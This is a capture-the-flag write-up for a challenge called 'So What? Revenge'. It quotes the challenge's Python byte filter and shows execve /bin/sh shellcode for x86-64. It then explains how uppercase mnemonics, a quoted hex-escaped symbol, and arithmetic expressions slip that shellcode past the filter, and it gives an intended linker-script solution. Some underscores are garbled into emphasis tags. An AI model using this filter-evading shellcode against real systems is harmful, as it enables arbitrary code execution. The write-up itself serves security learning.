@@ -1,0 +1,183 @@
+<h1>So What? Revenge</h1>
+
+<h2>Description</h2>
+
+<blockquote>
+  <p>Are you a shellcoding pro? If not, so what? (salt guaranteed once you know the solution)</p>
+</blockquote>
+
+<p>{% file src="../../.gitbook/assets/handout.py" %}</p>
+
+<h2>Solution</h2>
+
+<p>In this challenge, we were allowed to send an assembly source file that would be assembled with <code>as</code>. There are a number of filters that were being applied to our input.</p>
+
+<p>{% code overflow="wrap" %}
+```python
+last<em>byte = b""
+binary = b""
+while True:
+    byte = sys.stdin.buffer.read(1)
+    binary += byte
+    # allow cancer constraints here
+    # man, I really wish there was a way to avoid all this pain!!!
+    # lmao
+    if b"\x80" &lt;= byte &lt; b"\xff": # 1. printable shellcode
+        quit()
+    if byte in b"/bi/sh": # 2. no shell spawning shenanigans
+        quit()
+    if b"\x30" &lt;= byte &lt;= b"\x35": # 3. XOR is banned
+        quit()
+    if b"\x00" &lt;= byte &lt; b"\x05": # 3. ADD is banned
+        quit()
+    if byte == b"\n" and last</em>byte == b"\n":
+        break
+    last_byte = byte
+    if len(binary) &gt;= 0x1000:
+        exit(1)</p>
+
+<p>with open("libyour_input.so", "wb") as f:
+    f.write(binary)</p>
+
+<p>print("Assembling!")</p>
+
+<p>os.system("as libyour<em>input.so -o libyour</em>input.obj &amp;&amp; ld libyour<em>input.obj -shared -o libyour</em>input.so")
+```
+{% endcode %}</p>
+
+<p>The assembled library is then linked against <code>main</code>. A <code>libflag.so</code> is also compiled with <code>flag</code> defined, allowing it to have the <code>win()</code> function.</p>
+
+<p>```python
+main_source = """</p>
+
+<h1>include <stdio.h></h1>
+
+<p>extern int win();</p>
+
+<h1>ifdef flag</h1>
+
+<p>int win() {
+    printf("Congratulations!\n");
+    printf("FLAG_HERE");
+}</p>
+
+<h1>endif</h1>
+
+<p>int main() {
+    win();
+}
+"""</p>
+
+<p>with open("main.c", "w") as f:
+    f.write(main_source)</p>
+
+<p>os.system("gcc main.c -shared -o libflag.so -Dflag")
+os.system("gcc main.c -L. -lyour<em>input -o main")
+os.system("LD</em>LIBRARY_PATH='.' ./main")
+```</p>
+
+<h3>Unintended Solution</h3>
+
+<p>My unintended solution was to simply tackle the challenge the way it was presented, and evade the filters.</p>
+
+<p>Let's first assume that the filters weren't there. Our goal would be to export a <code>win</code> function in our shared library, which is run by <code>main</code>. The following shellcode spawns a <code>/bin/sh</code> shell.</p>
+
+<p><code>nasm
+.globl win
+win:
+    xor    %rdx, %rdx
+    mov    $7526411553527181103, %rbx
+    shr    $8, %rbx
+    push   %rbx
+    mov    %rsp, %rdi
+    push   %rax
+    push   %rdi
+    mov    %rsp, %rsi
+    mov    $59, %al
+    syscall
+    ret
+</code></p>
+
+<p>The first challenge we face is that we cannot have any of the characters in <code>"/bi/sh"</code>.</p>
+
+<p><code>python
+if byte in b"/bi/sh": # 2. no shell spawning shenanigans
+    quit()
+</code></p>
+
+<p>This can be evaded in our instructions by simply using uppercased code (which the assembler accepts), but dealing with the <code>win</code> label itself is a bit more tricky. We can't just use <code>WIN</code> since that would export a different symbol than the lowercased <code>win</code> we need.</p>
+
+<p>We ended up creating the <code>win</code> label using <code>.set</code>, which expects a symbol name that can be a quoted value. To set the correct address, we use <code>.</code> which means the current position.</p>
+
+<blockquote>
+  <p><code>.set</code> symbol, expression</p>
+  
+  <p>The <code>.set</code> directive assigns the value of expression to symbol. Expression can be any legal expression that evaluates to a numerical value.</p>
+</blockquote>
+
+<p>Great! This cursed code actually works, and linking it against <code>main</code> spawns a shell when running <code>main</code>.</p>
+
+<p>```nasm
+.GLOBL    "w\x69n"
+.SET      "w\x69n", .
+    XOR    %RDX, %RDX
+    MOV    $7526411553527181103, %RBX
+    SHR    $8, %RBX
+    PUSH   %RBX
+    MOV    %RSP, %RDI
+    PUSH   %RAX
+    PUSH   %RDI
+    MOV    %RSP, %RSI
+    MOV    $59, %AL
+    SYSCALL
+    RET</p>
+
+<p>```</p>
+
+<p>The final piece of the puzzle is to get rid of all digits <code>0</code> to <code>5</code>, since they correspond to the ASCII codes <code>\x30</code> to <code>\x35</code>.</p>
+
+<p><code>python
+if b"\x30" &lt;= byte &lt;= b"\x35":
+        quit()
+</code></p>
+
+<p>Since the <code>MOV</code> operands are expressions, we could make use of mathematical operations to arrive at the number we need. For instance:</p>
+
+<p>{% code overflow="wrap" %}
+<code>
+77768999999999 * 96779 + 788777778*6976 + 6798666 + 6699888 == 7526411553527181103
+</code>
+{% endcode %}</p>
+
+<p>And that was just what we needed to complete the shellcode!</p>
+
+<p>```nasm
+.GLOBL    "w\x69n"
+.SET "w\x69n", .
+    XOR    %RDX, %RDX
+    MOV    $77768999999999<em>96779 + 788777778</em>6976 + 6798666 + 6699888, %RBX
+    SHR    $8, %RBX
+    PUSH   %RBX
+    MOV    %RSP, %RDI
+    PUSH   %RAX
+    PUSH   %RDI
+    MOV    %RSP, %RSI
+    MOV    $66-7, %AL
+    SYSCALL
+    RET</p>
+
+<p>```</p>
+
+<p>Popping this into the challenge gives us a shell.</p>
+
+<figure><img src="../../.gitbook/assets/Screenshot 2022-09-26 at 12.34.25 AM.png" alt=""><figcaption></figcaption></figure>
+
+<h3>Intended Solution</h3>
+
+<p>The <code>libflag.so</code> was there for a reason! Notice that since <code>os.system()</code> does not raise an exception if the executed commands error out, we could just write to the <code>libyour_input.so</code> directly without ever writing assembly code.</p>
+
+<p>This meant that we could write a <a href="https://users.informatik.haw-hamburg.de/\~krabat/FH-Labor/gnupro/5_GNUPro_Utilities/c_Using_LD/ldLinker_scripts.html">linker script</a> that just links <code>libflag.so</code>.</p>
+
+<p><code>
+INPUT ( -lflag )
+</code></p>
